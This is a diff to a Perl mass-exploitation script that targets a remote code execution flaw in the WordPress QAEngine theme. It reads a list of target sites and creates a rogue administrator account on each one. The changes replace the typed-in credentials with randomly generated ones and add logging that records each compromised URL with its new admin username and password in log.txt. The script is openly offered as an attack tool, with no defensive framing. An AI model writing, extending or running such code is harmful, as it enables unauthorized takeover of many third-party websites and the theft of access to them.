@@ -21,11 +21,10 @@ return($random);
 flag();
 print "[+] Enter List Of Target : ";
 chomp (my $list=<>);
-print "[+] Enter User : ";
-chomp (my $user=<>);
-print "[+] Enter Password : ";
-chomp (my $pass=<>);
 print "[+] Started : $datestring\n";
+
+my $user = Generate_user();
+my $pass = Generate_user();
 open(my $arq,'<'.$list) || die($!);
 my @site = <$arq>;
 @site = grep { !/^$/ } @site;
@@ -53,10 +52,21 @@ sub expadd{
         print "[OK] New Admin Successfuly Created \n";
         print "| User : $user \n";
         print "| Pass : $pass \n";
+        save ("log.txt","$url : ($user:$pass)");
     }
-    else {print "[+] Error Creating New User \n\n";}
+    else {print "[+] Error Creating New User \n";}
 
 
 }
 sub flag {print "\n[+] WP QAEngine Theme R3m0t3 C0d3 Ex3cut10n (Add WP Admin) Exploiter \n[*] Coder => M-A\n\n";
+}
+sub Generate_user {
+my $rndstr = rndstr(6, 1..9, 'a'..'z');
+sub rndstr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
+}
+sub save {
+	my ($file,$item) = @_;
+	open(SAVE,">>".$file);
+	print SAVE $item."\n";
+	close(SAVE);
 }
